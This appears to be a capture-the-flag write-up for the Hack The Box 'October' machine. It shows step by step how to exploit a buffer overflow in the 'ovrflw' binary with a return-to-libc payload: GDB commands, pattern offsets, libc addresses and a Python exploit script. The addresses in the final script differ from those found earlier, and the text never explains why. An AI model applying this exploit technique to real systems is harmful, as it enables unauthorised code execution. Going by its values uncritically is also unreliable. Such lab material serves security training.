# Buffer Overflows

## Return Oriented Programming (ROP) Buffer Overflow
The following commands can be used in a Return Oriented Programming (ROP) buffer overflow attack to bypass NX/DEP protection.  The following example makes use of the `ovrflw` ELF Linux binary found on the October Hack The Box machine.  All tools necessary are built into Kali Linux.

The ovrflw binary is 32 bit and has NX enabled and the system has Address Space Layout Randomisation enabled.


### Finding the point that overwrites EIP CPU Register

The following command can be used to generate a 500 character non repeating pattern to overlow the program:

```/usr/bin/msf-pattern_create -l 500```

The resulting output can be fed as an input to the binary:

```./ovrflw Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A...```

You can increase the length of the pattern generated by the `/usr/bin/msf-pattern_create` command and send it to the program, until the program generates a `segmentation fault` error.

Upon the generation of a `segmentation fault`being thrown by the overflw program, it can then be ran within the debugger GDB to find what section of the pattern overwrote the EIP CPU register:

```gdb ./ovrflw```

Now a break point for the `main()` function can be added, the the program will pause once run within GDB.  The following code will add the break point:

```(gdb) b main```

The program can now be run by pressing the "r" key followed by the none repeating string of characters (in this case 500):

```r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4A...```

To continue the exection of the program the "c" key can be pressed.  This will result in a "
Program received signal SIGSEGV, Segmentation fault." error.

To view the curent values of the registers within GDB use the command:
`info registers`

Take the value held in the EIP register.  In this case it is `0x64413764`.  This value can be passed into msf-pattern_offset to find out the offset necessary to crash the program:

```msf-pattern_offset -q 0x64413764```

This showed the offset at the point EIP was overwritten was 112.  This means that 112 characters can be passed to the program to generate a segmentation fault.  

### Exploiting the buffer overflow using python and bash

Now three values are necessary to exploit the buffer overflow.  The addresses of system, exit and "/bin/sh" - in that order.

GDB can be used to find the address of system by running the following commands
``` gdb ./ovrflw 
b main
r
p system 
```

The `p system` command will give the address of where `system` is located, which in this case is `0xb765c310`.

Now to get the offset of "/bin/sh". GDB can be used to search for this value using the find command:

`find 0xb7646310, +9999999, "/bin/sh"`

The command will start at the system address and look for the pattern "/bin/sh" and then return the address offset once found.  The +999.. tells the command how far to look ahead from the system address. This can be incremented until the address is found.

The address of "/bin/sh" was found to be `0xb777ebac`.

The exit address can be found using the following command:

``` gdb ./ovrflw 
b main
r
p exit 
```
This gives the exit address 0xb764f260

The exploit will be 112\*characters + system address + exit address + "/bin/sh" address.  The following python exploit code contains the aforementioned structure.  Note that the struct library is used to put the data in little endian format, denoted by the "<I".  For instance, this would convert the exit address 0xb764f260 to 0x60f264b7.


#### Python Exploit Code
```#!/usr/bin/python

import struct

system_mem = struct.pack("<I", 0xb7646310)
binsh_mem = struct.pack("<I", 0xb7768bac)
exit_mem = struct.pack("<I", 0xb7639260)

payload = "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaab"
payload += system_mem
payload += exit_mem
payload += binsh_mem

print(payload)```

